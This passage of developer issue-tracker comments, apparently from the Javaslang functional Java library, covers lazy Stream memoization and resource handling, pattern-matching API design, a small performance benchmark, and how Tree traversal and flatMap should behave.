until head() is called on tail.\n\nI have the impression (which is perhaps the wrong impression) that you want to memoize by default. I think this is a mistake as it means the entire stream must be kept in memory, defeating the point of incrementally reading a stream.\n\nYes, that's right - but in my case no problem. I don't use a Map for caching values. Instead I cache lazy generated values per element. Cons memoizes its tail and Deferred caches its wrapped Stream.\nI made tests, printing infinitely long byte streams to the console and calling frequently the garbage collection. This behaved nicely. However, without calling the garbage collector explicitely, the mem explodes (but the CPU was at 700%).\nHere is the test code:\n``` java\nInputStream in = new InputStream() {\n    Stream stream = Stream.gen(Math::random).map(d -> new Double(d * 255).byteValue());\n    @Override\n    public int read() throws IOException {\n        int next = stream.head();\n        stream = stream.tail();\n        return next;\n    }\n};\nStream.bytes(in).map(i -> {\n    if (Math.random() < 0.1) {\n        System.gc();\n    }\n    return i;\n}).out();\n```\nThe Java process stays constantly at 35 MB.\nUpdate: Oh noes: By producing more output / fewer gc(), the mem goes up:\njava\n- - - - - -8<- - - -*snip*- - - - - -8<- - - -\nif (Math.random() < 0.00001) {\n        System.err.println(\"#### \" + i);\n        System.gc();\n}\n- - - - - -8<- - - -*snap*- - - - - -8<- - - -\n\nI didn't understand your example:\nStream.of(inputStream1).zip(inputStream2).join()\nIf I consider the types: Stream.of(inputStream1) returns Stream> and then zip would return Stream, B>>, which means join would not have the right type.\n\nYes, the code example was very unclear (in fact also wrong). inputStream1 and inputStream2 are of type java.util.InputStream. Also there is no such of-method.\nHere is a better example:\nStream.bytes(inputStream1).zip(Stream.lines(inputStream2)) returns Stream<Tuple2<Byte,String>>.\nThen .join() would concatenate the String representations of all elements and forces the Stream to be evaluated.\nIf one Stream is finite and the other infinite, the infinite (currently) would not be closed by zip, which is a resource leak.\nClosing resources appropriately comes next...\n. What is the u needed for in P.lazy(u -> { ... })?\nNow new Cons<>(iterator.next(), () -> Stream.of(iterator)) receives a Supplier<P1<Stream<T>>> instead of a Supplier<Stream<T>>. Do we really need the extra type P1? Unfortunately it is not of type Stream...\nUpdate: I like the use of SoftReference for memo in fj!\n. I read you prev post in depth tomorrow - really need some sleep :)\n. I understand IO and see its benefits. Currently I'm going one step further and investigating how to embed the Iteratee/Enumerator approach into Stream.\nWikipedia:\n\n\"Iteratees were created due to problems with existing purely functional solutions to the problem of making input/output composable yet correct. Lazy I/O in Haskell allowed pure functions to operate on data on disk as if it were in memory, without explicitly doing I/O at all after opening the file - a kind of memory-mapped file feature - but because it was impossible in general (due to the Halting problem) for the runtime to know whether the file or other resource was still needed, excessive numbers of files could be left open unnecessarily, resulting in file descriptor exhaustion at the operating system level. Traditional C-style I/O, on the other hand, was too low-level and required the developer to be concerned with low-level details such as the current position in the file, which hindered composability. Iteratees and enumerators combine the high-level functional programming benefits of lazy I/O, with the ability to control resources and low-level details where necessary afforded by C-style I/O.\"\n\nResources:\n- A good resource to start reading is Oleg's Iteratee (Haskell)\n- An introduction to Iteratees: http://de.slideshare.net/afwlehmann/iteratees-intro\n- Runar's blog post on Iteratees in Scalaz\n- The solution Runar describes in Ch. 15 of 'FP in Scala' and @mperry's port to Java.\n- Akka has a simple implementation of Oleg's Iteratee called IO.Iteratee.\n- Play Framework 2 does this as described in the docs. Here is the source.\n. @mperry, @talios (Mark & Mark :-))\nHi there! Sorry for joining the party a little late. I felt like a zombie the last days after releasing Javaslang 1.1.0 because of the lack of sleep and had to keep away from my laptop a while :-)\nMark P.,\n\nstatic  B match(A a, List c, F<? extends A, B>>> f)\n\nI think it should be F<? super A, ? extends B>. Notably this takes an A and returns a B.\n\n\nit would be nice to unify the methods whenClass and appendClass. It feels a bit stilted and hard to remember that the first call is whenClass to create a When and the appendClass after that. I think Java was preventing me having a static and not-static method having the same name, but I need to have more of a play.\n\n\nI use the object oriented builder pattern to be able to use static methods, e.g.\njava\nclass Match {\n   static Match.Builder whenClass(...) {\n      return new Match.Builder().whenClass(...);\n   }\n   static class Builder() {\n      Builder whenClass(...) {\n          // ...\n          return this;\n      }\n      Match build() {\n          // return a Match with all whenClass branches captured\n      }\n   }\n}\nAdditionally Match<R> implements Function<Object, R>, i.e. if we build a Match, we can reuse it as ordinary function in an arbitrary context!\nWhen I create a new API, I write it down exactly as I want to use it as developer, e.g. looking as Scala's match\njava\nsomething match {\n    case Some(x) => \"some: \" + x\n    case None => \"none\"\n    case _ => ...\n}\nI ended up here for Java 8:\njava\nMatch\n    .caze((Some s) -> \"some: \" + s.get())\n    .caze((None n) -> \"none\")\n    .orElse(...)\n    .apply(something); // we could use build() instead to get a function\n\n\nthe type inference sucks, I tried a few different ways, but the whenClass and appendClass methods have to be able to return the parent class Process, whilst taking a function with the subclass as argument, e.g. Emit. I might be able to play with generics to make this nicer when appending a When to another When, but it is crappy.\n\n\nI think it is not possible to not give the compiler a hint of the return type, in my case:\njava\nfinal Function<Object, Number> f = Match\n    .<Number> caze((int i) -> i) // return type would be Integer otherwise\n    .caze((BigInteger i) -> i)\n    .build();\nfinal Number num = f.apply(1);\n\n\nThe class you pass in to whenClass has no relationship to the arguments in the function. Java generics sucks and because we are doing this at runtime we have to deal with type erasure. The compiler needs to support this, so this code is a workaround.\n\n\nYes, type erasure really sucks!! We have to live with that...\nMark D.,\nThe verbosity of Java's generics is a slam in the face. I would like to see a good type inference in a future release of Java...\nBtw. - I'm currently designing the Property checker API and have nice ideas! Property checking will be next in Javaslang! functionaljava also has this, did you take a look?\n- Daniel\n. If 1) a read operation fails or 2) the end of the input is reached, we need to close the input.\nThis has to hold also for combined input sources. If an error occurs in an underlying input source, the whole, combined input has to be closed. Also all underlying inputs have to be closed, if the wrapping input is closed from the outside. Additionally, if one of the combined inputs end has reached, all other combined inputs have to be closed, too.\nThis leads to the idea of a special Iterator, that handles resources and is composable:\n``` java\npublic interface Chunked extends Iterator, AutoCloseable {\nstatic <T> Chunked<T> of(CheckedRunnable close, CheckedSupplier<Boolean> hasNext, CheckedSupplier<T> next) {\n    return new Chunked<T>() {\n\n        @Override\n        public void close() {\n            Try.run(close);\n        }\n\n        @Override\n        public boolean hasNext() {\n            return Try.of(hasNext)\n                    .onFailure(x -> close())\n                    .map(b -> { if (!b) { close(); } return b; })\n                    .get();\n        }\n\n        @Override\n        public T next() {\n            return Try.of(next)\n                    .onFailure(x -> close())\n                    .get();\n        }\n    };\n}\n\n@Override\nvoid close();\n\n@Override\nboolean hasNext();\n\n@Override\nT next();\n\ndefault <T2> Chunked<Tuple2<T, T2>> combine(Chunked<T2> that) {\n    final CheckedRunnable close = () -> { Try.run(this::close); Try.run(that::close); };\n    final CheckedSupplier<Boolean> hasNext = () -> this.hasNext() && that.hasNext();\n    final CheckedSupplier<Tuple2<T, T2>> next = () -> Tuple.of(this.next(), that.next());\n    return Chunked.of(close, hasNext, next);\n}\n\n}\n```\nThere are similarities to Stream:\n- Stream.head()  ~ Chunked.next()\n- Stream.tail() ~ Chunked.hasNext()\n- Stream.zip() ~ Chunked.combine()\nIf Stream also implements AutoClosable, we do have the missing close() function. Given that, I should be able to provide a resource-safe implementation of Stream.\nThe current implementation of Stream makes use of memoization. Question: Is the following Cons eventually garbage collected, if it is not referenced any more but tail is referenced?\njava\nCons(head, lazy tail = Nil))\nThe given tail is wrapped in a memoizing Lazy (currently using a hard-reference). Perhaps this prevents the GC from freeing the mem of tail, Lazy and Cons. A soft-reference may help but the lazy tail of Cons is (initially) the only reference to the tail. This means tail may be garbage collected immediately. And this means that operations of finite Streams like reverse() are unstable.\nUpdate:\nTaken from the Scala documentation of scala.collection.immutable.Stream:\n\nOne must be cautious of memoization; you can very quickly eat up large amounts of memory if you're not careful. The reason for this is that the memoization of the Stream creates a structure much like scala.collection.immutable.List. So long as something is holding on to the head, the head holds on to the tail, and so it continues recursively. If, on the other hand, there is nothing holding on to the head (e.g. we used def to define the Stream) then once it is no longer being used directly, it disappears.\n- Scala has scala.io.Source to iterate (once) over chunks of data read from an input. It is said to be \"(...) just (a) hack done to provide support for limited needs.\"\n- Scalaz has its own streaming library scalaz-stream.\n- Play has Enumerator/Iteratee - a very general approach to stream data in a composable way\n\nUpdate 2:\nThe main goal of Javaslang is to be simple. I would prefer one lazy type Stream for processing of arbitrary inputs, including fixed size sequences, data suppliers, Iterables/Iterators and InputStreams. Of course the implementation of Stream could differ in each of these cases, including memoization, resource handling etc. This would make Stream a general purpose tool - a swiss army knife for Joe Average (like me).\n- List - eager processing of data, each operation is processed immediately\n- Stream - lazy processing of data, a bulk of operations is processed per element - once, i.e. results are memoized\n- ?UnknownType? - non-blocking processing of data.\nQuestion: Is non-blocking the same as lazy here?\nAnswer: No. When we hear non-blocking, our reflex is Future and Promise (aka CompletableFuture). In contrast to using callbacks, a Stream is blocking when values are requested. A non-blocking behavior is out of scope here.\n. Also http://blog.higher-order.com/assets/scalaio.pdf\n. Daniel Spiewak is working on this:\nhttps://gist.github.com/djspiewak/6b5cd3fb78b054046755\nin the context of this\nhttps://github.com/scalaz/scalaz-stream/blob/master-a/src/main/scala/scalaz/stream/Process.scala#L657\n. (3 Months later...)\nNow it is time to get this done. @mperry: Introducing a Deferred Stream is dirty, it would pollute the Stream code with outside IO aspects (like blocking) - I will take the approach you suggested by returning a lazy Stream when contstructing a Stream from a possibly blocking InputStream.\nAdditionally I will experiment with Chunked data, which is Autoclosable and composable...\nUpdate: I could also imagine a third possibility beside Lazy<Stream<T>> and Stream<Lazy<T>>:\nInternalizing the 'laziness' and keep the Stream type definition 'clean':\n``` java\nclass Cons implements Stream {\nfinal Lazy<T> head;\nfinal Lazy<Stream<T>> tail;\n\nCons(Lazy<T> head, Lazy<Stream<T>> tail) {\n    this.head = head;\n    this.tail = tail;\n}\n\nT head() {\n    return head.get();\n}\n\nStream<T> tail() {\n    return tail.get();\n}\n\n}\n```\nThe headhas to be Lazy in order to make the Stream non-blocking. An eager head would make the whole Stream block if the underlying InputStream is blocking.\nThe tailhas to be Lazy to be referential transparent, i.e. consistent regarding re-evaluation of the Stream. If the tail would be a stateful Supplier instead of a Lazy, it could return a different tail each time it is called. A memoizing Lazy is preventing this.\nUpdate 2: Of cause we still need Stream.of(InputStream) to return a Lazy<Stream<T>> because the result could be Nil, i.e. the empty Stream\n. How is memory managed regarding of memoized values in conjunction with infinitely long stream which recursively hold on head/tail? Scala seems to internally memoize values (via SoftReference?). On the other hand, an Iterator does not store elements.\nTaken from the Scala 2.11.5 API reference of scala.collection.immutable.Stream:\n\nThere are a number of subtle points to the above example.\n- The definition of fibs is a val not a method. The memoization of the Stream requires us to have somewhere to store the information and a val allows us to do that.\n- While the Stream is actually being modified during access, this does not change the notion of its immutability. Once the values are memoized they do not change and values that have yet to be memoized still \"exist\", they simply haven't been realized yet.\n- One must be cautious of memoization; you can very quickly eat up large amounts of memory if you're not careful. The reason for this is that the memoization of the Stream creates a structure much like scala.collection.immutable.List. So long as something is holding on to the head, the head holds on to the tail, and so it continues recursively. If, on the other hand, there is nothing holding on to the head (e.g. we used def to define the Stream) then once it is no longer being used directly, it disappears.\n- Note that some operations, including drop, dropWhile, flatMap or collect may process a large number of intermediate elements before returning. These necessarily hold onto the head, since they are methods on Stream, and a stream holds its own head. For computations of this sort where memoization is not desired, use Iterator when possible.\n\nUpdate: I think that SoftReferences are not a good idea in this context!\n. I think I wired the resource handling up using Chunked mentioned above.\nThe whole blocking stream thing seems not to be solvable with streams which pull data, i.e. when they ask for availability. I like the explanation here: jlongster/transducers.js#22\nI think with transducers a pipeline of operations can be recorded in some way. Then the blocking input is connected to the transducer. When input is available, it is pushed to the transducer, which starts a 'playback' of operations on the chunks.\nThis would lead to a new data type Transducer - Streams are no option for non-blocking data handling...\nIt needs a decision, would Stream should do and what no, i.e. if streams can be created based on InputStreams, if they should be AutoClosable, etc.\n. Famous last words: 'A stream is a lazy linked list.'\n. @lukaseder I read your tweet\n\nSophisticated Trolling. Noun. The rare ability of luring both sides into their inevitable doom, walking away from discussion smirkingly.\n\nand just want to say, that this issue moved to https://github.com/javaslang/javaslang/issues/186 in order not to be a Troll :-)\n. There is no direct link - in order to provide a good support here I'm figuring out how to close a ticket. If multiple people are discussing a specific subject, I don't want to just close the ticket without a common agreement. In this case, it should be ok. The whole async/reactive thingy is not just a feature, it's an epic...\n. Nice! I will copy that :-)\n. I want Javaslang to have a processing pipeline for chunked data that may fail to read (/write?).\n. I drop this feature (for now). This should not be baked into collections, it is a 'reactive' topic.\nIf resource handling is important, it will appear again later.\n. The type of nothing/no elements cannot be determined at runtime. Scala has the same 'problem' which is circumvented by throwing - as we will do.\n. This does not make sense here. In fact the Memoized type is misnamed. It should be a Lazy which, in contrast to Supplier, remembers the value (by internally memoizing it).\nA Lazy0<R> is a Function0<R>, i.e. a () -> value.\n. LGFM\n. Hi Lukas, just found you comment - my inbox explodes because of my own activity :-)\nYes, good idea - I thought of sth similar months ago but forgot about it.\nGood to know you have an eye on it!!\n. See #196 \n. Generator removed. For missing Javadoc see #97.\n. With #227 Match will implement Monad\n. Follow-up: #317 \n. There is currently no use-case for that.\n. TODO:\n- [NO] Use reflection to add java.lang.* to knownSimpleClassNames, in order to prevent classes with same simple names as java.lang.* to be imported\n- [OK] Handle static imports, i.e. implement ImportManager.getStatic() to import static methods\n- [OK] Add a wildcardThreshold feature, which defines, when multiple imports from the same package (type) or class (static) are reduced to one import statement using wildcard '*'\n. The 'Use reflection to add java.lang.* to knownSimpleClassNames, in order to prevent classes with same simple names as java.lang.* to be imported' feature is dropped due to a (cost / benefit analysis](http://stackoverflow.com/questions/520328/can-you-find-all-classes-in-a-package-using-reflection).\nThe preferred way is to control the import behavior by using the (already existing) knownSimpleClassNames parameter. I.e. set knownSimpleClassNames = List(\"java.lang.String\")if ImportManager.getType(\"my.package.String\") should result in not importing my.package.String and use full qualified references within the code.\nHowever, by using knownSimpleClassNames we may manage that java.lang.String is fully qualified by not mentioning it to be known.\n. Some additional information on Traversable.average():\n``` java\n        // import javaslang.collection.List;\n    // = 2\n    List.of(1, 2, 3, 4).average();\n\n    // = 2.5\n    List.of(1.0, 2.0, 3.0, 4.0).average();\n\n    // = BigDecimal(\"0.5\")\n    List.of(BigDecimal.ZERO, BigDecimal.ONE).average();\n\n\n    // = UnsupportedOpertationException(\"average of nothing\")\n    List.nil().average();\n\n    // = UnsupportedOpertationException(\"not numeric\")\n    List.of(\"1\", \"2\", \"3\").average();\n\n    // works well with java.util collections\n    final java.util.Set<Integer> set = new java.util.HashSet<>();\n    set.add(1);\n    set.add(2);\n    set.add(3);\n    set.add(4);\n    List.of(set).average(); // = 2\n\n```\n. Forgot to mention that I removed the Monoid interface from all collections because of course (combine, zero) is not unique.\n. The Scala StringContext is interpreted wrong by IntelliJ IDEA under certain circumstances. The effort to refactor the Generator and the Maven build process is too high. Therefore a workaround is provided:\n``` scala\nval javadoc = \"**\"\nxs\"\"\"\n/*\n * ERROR\n /\n\"\"\"\nxs\"\"\"\n/$javadoc\n * OK\n */\n\"\"\"\n```\n. Current status: 100% code coverage.\n. Idea to test a custom random:\nUse generator of {1, 2} with a custom random which always returns 1 and a property which succeeds for 1 and fails for 2.\n. Implemented the idea described above and reverted it. No good DX, too much additional methods.\n. More like this...\n``` java\n@SuppressWarnings(\"Convert2MethodRef\")\npublic interface Monad1Laws> extends Functor1Laws {\n// unit(a).flatMap(f) \u2261 f a\ndefault <U> CheckResult checkLeftIdentity(Arbitrary<T> ts, Function<? super T, ? extends Monad1<T, M>> unit, Function<? super T, ? extends Monad1<U, M>> f) {\n    return Property\n            .forAll(ts)\n            .suchThat(t -> {\n                final Monad1<U, M> term1 = unit.apply(t).flatMap((T tt) -> f.apply(tt));\n                final Monad1<U, M> term2 = f.apply(t);\n                return term1.equals(term2);\n            })\n            .check();\n}\n\n// m.flatMap(unit) \u2261 m\ndefault CheckResult checkRightIdentity(Arbitrary<Monad1<T, M>> ms, Function<? super T, ? extends Monad1<T, M>> unit) {\n    return Property\n            .forAll(ms)\n            .suchThat(m -> {\n                final Monad1<T, M> term = m.flatMap((T t) -> unit.apply(t));\n                return term.equals(m);\n            })\n            .check();\n}\n\n// m.flatMap(f).flatMap(g) \u2261 m.flatMap(x -> f.apply(x).flatMap(g))\ndefault <U, V> CheckResult checkAssociativity(Arbitrary<Monad1<T, M>> ms, Function<? super T, ? extends Monad1<U, M>> f, Function<? super U, ? extends Monad1<V, M>> g) {\n    return Property\n            .forAll(ms)\n            .suchThat(m -> {\n                final Monad1<V, M> term1 = m.flatMap((T t) -> f.apply(t)).flatMap((U u) -> g.apply(u));\n                final Monad1<V, M> term2 = m.flatMap((T t) -> f.apply(t).flatMap((U u) -> g.apply(u)));\n                return term1.equals(term2);\n            })\n            .check();\n}\n\n}\n```\nInteresting question: How would an Arbitrary<Function> look like?\nE.g. Arbitrary<Function<? super T, ? extends Monad<U, M>>>\n. Strings stays (for now)...\n. - package-info.java is preferred over package.html (see http://stackoverflow.com/questions/3644726/javadoc-package-html-or-package-info-java)\n- maven javadoc plugin uses src/main/javadoc/overview.html by default\n. ## Javadoc checklist\njavaslang \u2713\n\nCheckedFunction0-26 \u2713\nFunction0-26 \u2713\nTuple \u2713\nTuple0-26 \u2713\nValueObject \u2713\n\u03bb \u2713\n\njavaslang.algebra \u2713\n\nFunctor1-26 \u2713\nHigherKinded1-26 \u2713\nMonad1-26 \u2713\nMonoid \u2713\nSemigroup \u2713\n\njavaslang.collection \u2713\n\nBinaryTree \u2713\nList \u2713\nRoseTree \u2713\nSeq \u2713\nStream \u2713\nTraversable \u2713\nTree \u2713\n\njavaslang.control \u2713\n\nEither \u2713\nFailure \u2713\nLeft \u2713\nMatch \u2713\nMatchError \u2713\nNone \u2713\nOption \u2713\nRight \u2713\nSome \u2713\nSuccess \u2713\nTry \u2713\n\njavaslang.test \u2713\n\nArbitrary \u2713\nCheckable \u2713\nCheckResult \u2713\nCheckResultAssertions \u2713\nGen \u2713\nProperty \u2713\n. Random thoughts:\nAdd @since tags to javadoc (packages and classes).\nBeware of formatting (IDEA destroys the Javaslang ascii intros)\n. The urls on the Javaslang landing page changed for 2.0.0. Change 'latest' to 'snapshot' in javadoc urls.\n\nAlso update:\n- JAVALSANG_VERSIONS variable (index.html)\n- README.md at github.com/javaslang\n. It is time to make 'closed shop' for new features. The remaining things are:\n- Finish (Sorted) Set & Map\n- Missing Traversable & Seq methods\n- Get Tree right\n- Revise Future & Promise\n- Bump up unit tests to ~100%\n. Changes to the type hierarchy between BETA and RC1:\nBETA\n\nRC1\n\n. If s.th. goes wrong during release regarding SCM, take a look at #899 \n. Done.\n. obsolete - old milestone\n. moved to javaslang-parser\n. Depends on #110 \n. This function is too specific. We will not implement it. It can be realized in a one-liner.\n. Rule of thumb: We should not provide combined API, like 'count' and 'occurrences' in one method. This is concidered as smell, wlog. Exception is flatMap for example :)\n. Example:\njava\nList.of(1, 2, 3, 2, 3, 4, 5, 6, 6)\n    .groupBy(i -> i)\n    .map((i, list) -> Entry.of(i, list.length()))\n    .stdout();\nOutput:\n1 -> 1\n2 -> 2\n3 -> 2\n4 -> 1\n5 -> 1\n6 -> 2\n. Here is a benchmark created on my early 2011 MacBook Pro using Scala 2.11.6, Java 1.8.0_40 and Javaslang 1.3.0-SNAPSHOT.\nTest setup\nThe test covers the creation of an infinite lazy stream of ints starting with 1, filtering even numbers and dropping 100 million elements. The first element of the remaining stream is taken.\n1. Start time mesure\n2. Execute command\n3. Print time\nThe code was executed with IntelliJ IDEA 14.1 CE.\nThe results\n| Library | Time | Command |\n| :-- | :-- | :-- |\n| Java | 0,5 sec |   |\n| Java | 1,5  sec |   |\n| Java | OutOfMemoryError |   |\n| Javaslang | 15,8 sec |   |\n| Scala | 17,7 sec |   |\nConclusion\nJava's Stream is blazing fast.\n(-- long time nothing)\nJavaslang's Stream is a great alternative to Java's Stream. It is more concise and more powerful regarding the amount of operations. Starting with Java's Stream we come soon to the point that it is hard or even not possible to express something with the Stream API. Javaslang's Stream is slightly faster than Scala's Stream.\nJava's Stream.parallel() feature does not convince me. It is a great tool to optimize carefully selected parts of our application but should be used with caution.\n. This was just a little spike. Comes time and progress, there will be a complete benchmark of all Stream methods of all relevant frameworks.\nAlso a more mature comparison makes sense. Structural data types vs. in-place operations. Reusability of instances, thread-safety and immutability. Primitive types vs. objects. Sequential vs. parallel processing. Conciseness, usability, etc. There is much to say...\n. > Does this results still hold? Sounds like Vavr Stream is a huge performance hit compared to Java one. If so, shouldn't we be using Java 8 Stream?\nThere is only one think Vavr's Stream and Java's Stream have in common - the name :)\nReally, Vavr's Stream is a persistent linked list, like List, but lazily evaluated, like Iterator. The main difference to Java's Stream is, that Vavr's Stream can be processed multiple times. Java's Stream really is a 'sophisticated' Iterator, very much like Vavr's io.vavr.collection.Iterator.\nThis is all aligned to the Scala world, so it is nothing new.\nAs an advice, I would use Java's Stream in a local context (like a method body) as a form of reduction or transformation of elements like java.util collections or arrays. If your code gets clumsy because you are in 'Collectors Hell', then it might be a viable solution to use Vavr's collections. You will trade conciseness against performance. However, it is still a solution to use Vavr's Iterator instead of Java's Stream.. Already done:\n- every Function has andThen, reversed, curried, tupled\n- every Function1 has compose\n- Every XxxConsumer has a andThen(XxxConsumer after) method which first this.accept and then after.accept the argument(s).\n- Function and every XxxFunction has identity\n- UnaryOperator and every XxxUnaryOperator has identity\n- Reduce amount of classes by taking combinations of argument for functional interfaces of arity 2. (in general there are n! / k!(n-k)! combinations, see http://en.wikipedia.org/wiki/Combination)\n- Rename args of same type to BiXxx, e.g. CharCharPredicate -> CharBiPredicate, CheckedCharCharFunction to CheckedCharBiFunction\n- Extending Java's original functional interfaces\n- ~~Fix type hierarchy:~~\n  - ~~javax.util.function.UnaryOperator<T> should extend javax.util.function.Function<T, T> instead of javaslang.Function1<T, T>~~\n  - ~~javax.util.function.BinaryOperator<T> should extend javax.util.function.BiFunction<T, T, T> instead of javaslang.Function2<T, T, T>~~\nLast things TODO:\n- Every function of arity 1 overrides compose\n- Every XxxPredicate has  and, or, negate. Predicate<T> also has isEqual(Object)\n- BinaryOperator has minBy(Comparator), maxBy(Comparator) - XxxBinaryOperator could have min and max\nmissed s.th.?\n. like so http://docs.scala-lang.org/tutorials/FAQ/yield.html\n. Yes :) Thanks for sharing\n. Duplicate to #68 , fixed with #1128 \n. Unlike the implementation suggested here, it is not necessary to make the implementation concurrent because List and Stream aren't. That leads to\njava\n<U> Stream<T> distinct(Function<? super T, ? extends U> keyExtractor) {\n    final Set<U> seen = new HashSet<>();\n    return filter(t -> seen.add(keyExtractor.apply(t)));\n}\n. http://blog.richdougherty.com/2009/04/tail-calls-tailrec-and-trampolines.html\n. Also this http://www.javacodegeeks.com/2015/10/stack-safe-recursion-in-java.html\n. But I must admit that this seems not practical to me. It is more like a proof that there is an abstraction that makes it possible (to have stackless recursion) from a technical viewpoint.\nIf the underlying language (here: Java) has no native support for tail recursion, we should find another way to express our business problem, i.e. it is better to not use recursion at all.\nIn the end we have to decide, what's more important: memory/performance or readability/purity.\n. I will close this as not desirable for Javaslang. I can't suggest it to developers because of memory consumption of additional intermediate objects.\n. Update: For javaslang.collection.List<T> it is\nJava\nList<List<T>> combinations(List<T> elements, int k) {\n    return (k == 0) ? List.cons(List.nil()) :\n        elements.zipWithIndex().flatMap(t ->\n            combinations(elements.drop(t._2 + 1), (k - 1)).map(c -> c.prepend(t._1)));\n}\n. Just for the sake of completeness - this is the corresponding Scala code:\nScala\ndef combinations[A](elements: Seq[A], k: Int): Seq[Seq[A]] =\n  if (k == 0) Seq(Seq()) else\n    elements.zipWithIndex.flatMap {\n      case (e, i) => combinations(elements.drop(i + 1), k - 1).map(c => e +: c)\n    }\nThe original Scala SeqLike.combinations(n) takes ~50 lines of code but does not use recursion.\n. Obsolete. Because of the type system consistency, Traversable impls have to implement combinations() by themaelves (in order to get the correct return type without delegating to super)\n. Depends on #170 \n. @ggalmazor provided https://gist.github.com/ggalmazor/d5e74c44e7df741e6571\n. S.th. like List.rangeClosed(0, size()).map(k -> combinations(k)).flatten(). Need a general Traversable.flatten() for that - see #112\n. This is a good reference for permutations and variations: http://vkostyukov.ru/posts/combinatorial-algorithms-in-scala/\n. ## Traversing a Tree\nA Tree has an order, pre-order by default. The order may be changed, however, then a new Tree instance is created - for that node only. Different nodes of a tree may have a different order associated with. If a node is traversed, the order of the current node is taken into account when traversing all nodes. There are different methods to traverse a tree. All of them return a Seq:\n- traverse() - uses the actual order of the node\n- traverse(Tree.Order) - uses a specific order and ignores the actual order of the current node\n- preOrder() - depth first, shorthand for traverse(Tree.Order.PRE_ORDER)\n- postOrder() - post order, shorthand for traverse(Tree.Order.POST_ORDER)\n- inOrder() - in order, shorthand for traverse(Tree.Order.IN_ORDER)\n- levelOrder() - breadth first, shorthand for traverse(Tree.Order.LEVEL_ORDER)\nImplementing Traversable and Monad\nWhen implementing Traversable most methods will return a Seq, according to the underlying order of the tree. Internally the tree is traversed to perform these operations. More specific, the implementation delegates to the Seq returned by traverse(). Example:\njava\ninterface Tree<A> extends Traversable<A> {\n    default Seq<A> drop(int n) {\n        return traverse().drop(n);\n    }\n}\nDifferent to most of the Traversable methods, the Monad methods implemented by Tree are meant to preserve the Tree structure.\nInteresting is, how to flatten or flatMap a tree - this is not clear. A binary search tree for example, having only values at the leafs, could be flatMapped as follows:\njava\ninterface Tree<A> {\n    default Tree<B> flatMap(Function<A, Tree<B>> f) {\n        return Match.ofType(Tree.class)\n                .caze((Nil nil) -> nil)\n                .caze((Leaf leaf) -> f.apply(leaf.value))\n                .caze((Node node) -> new Node<>(node.left.flatMap(f), node.right.flatMap(f)))\n                .apply(this);\n    }\n}\nA good point to start is to take a look at the behavior of scalaz tree:\n- Example of flatten: http://stackoverflow.com/a/20926958/1110815\n- Howto start Scalaz REPL: http://stackoverflow.com/a/16528434/1110815\n. Please consider to let traverse() return Seq<Tree<T>> instead of Seq<T>, i.e. operations like drop return a forest. For head() et. al. it is ok to return a Tree<T> (= most specefic).\nA Seq<T> could be obtained by flatten()-ing the Seq<Tree<T>>\n. A scala worksheet is probably not the ideal way to test it, but it works:\n``` scala\nimport scalaz., Scalaz.\nobject App extends TreeFunctions {\nval t = node(List(List(1)), Stream(node(List(List(2)), Stream(leaf(List(List(3, 4), List(5))))), leaf(List(List(4)))))\ndef test1 =\n    t.flatMap(l => leaf(l.flatten)).drawTree\ndef test2 =\n    t.flatMap(l => node(l.flatten, Stream(leaf(l.flatten), leaf(l.flatten)))).drawTree\n}\nApp.test1\nApp.test2\n```\nOutput:\n`` scala\nres0: String = [1]\n|\n+- [2]\n|  |\n|- [3,4,5]\n|\n`- [4]\nres1: String = [1]\n|\n+- [1]\n|\n+- [1]\n|\n+- [2]\n|  |\n|  +- [2]\n|  |\n|  +- [2]\n|  |\n|  - [3,4,5]\n|     |\n|     +- [3,4,5]\n|     |\n|- [3,4,5]\n|\n- [4]\n   |\n   +- [4]\n   |- [4]\n```\n. The above example leads for RoseTrees to (not tested if this compiles or makes sense):\njava\ninterface Tree<A> {\n    default Tree<B> flatMap(Function<A, Tree<B>> f) {\n        return Match.ofType(Tree.class)\n                .caze((Nil nil) -> nil)\n                .caze((Leaf leaf) -> f.apply(leaf.value))\n                .caze((Node node) -> {\n                    final Tree<B> tree = f.apply(node.value);\n                    return new Node<>(tree.value, tree.children.appendAll(this.children.map(c -> c.flatMap(f))));\n                })\n                .apply(this);\n    }\n}\n. For BinaryTrees with values at inner nodes and leafs I think of\n1. map a node.value to a Tree\n2. add node.children as children to each leaf of the mapped tree of 1.\n~~This implies, that the empty tree is not allowed! We should omit it and use an Option to express the existence of a Tree.~~ Update: that's totally wrong. A binary tree/a half leaf may have one empty child.\n. Looking at the methods of Traversable, there are many methods, where it makes sense to return Tree instead of Seq, contrary as stated above.\nEspecially looking at the transformational operations, they can be divided into\n1. transforming values, e.g. replace(Object, Object)\n2. transforming structure, e.g. sliding(int, int)\n. Thoughts on return types...\nConversion (return type as in Seq / not Tree)\n- toJavaArray(Class)\n- toJavaList()\n- toJavaMap(Function)\n- toJavaSet()\n- toJavaStream()\nBasic operations (return type as in Seq / not Tree)\n- clear() (return type empty Tree)\n- head()\n- headOption()\n- init()\n- initOption()\n- isEmpty()\n- last()\n- lastOption()\n- length()\n- tail()\n- tailOption()\nMutation (return type unclear)\n- append(Object)\n- appendAll(Iterable)\n- insert(int, Object)\n- insertAll(int, Iterable)\n- prepend(Object)\n- prependAll(Iterable)\n- set(int, Object) (return type Tree)\nFiltering (return type Tree)\n- distinct()\n- distinct(Function)\n- filter(Predicate)\n- remove(Object)\n- removeAll(Object)\n- removeAll(Iterable)\n- retainAll(Iterable) (<-- return type unclear)\nNumeric operations (return type as in Seq / not Tree)\n- average()\n- product()\n- sum()\nReduction (return type as in Seq / not Tree)\n- fold(Object, BiFunction)\n- foldLeft(Object, BiFunction)\n- foldRight(Object, BiFunction)\n- foldMap(javaslang.algebra.Monoid, Function)\n- join()\n- join(CharSequence)\n- join(CharSequence, CharSequence, CharSequence)\n- max()\n- maxBy(Comparator)\n- min()\n- minBy(Comparator)\n- reduce(BiFunction)\n- reduceLeft(BiFunction)\n- reduceRight(BiFunction)\nSelection (return type as in Seq / not Tree)\n- drop(int)\n- dropRight(int)\n- dropWhile(Predicate)\n- findAll(Predicate)\n- findFirst(Predicate)\n- findLast(Predicate)\n- get(int)\n- indexOf(Object)\n- lastIndexOf(Object)\n- subsequence(int)\n- subsequence(int, int)\n- take(int)\n- takeRight(int)\n- takeWhile(Predicate)\nSide-effects (return type void)\n- forEach(Consumer)\n- peek(Consumer)\n- stderr()\n- stdout()\nTests (return type boolean)\n- contains(Object)\n- containsAll(Iterable)\n- exists(Predicate)\n- existsUnique(Predicate)\n- forAll(Predicate)\nTransformation of Structure (return type mostly Seq)\n- combinations()\n- combinations(int)\n- flatMap(Function)\n- 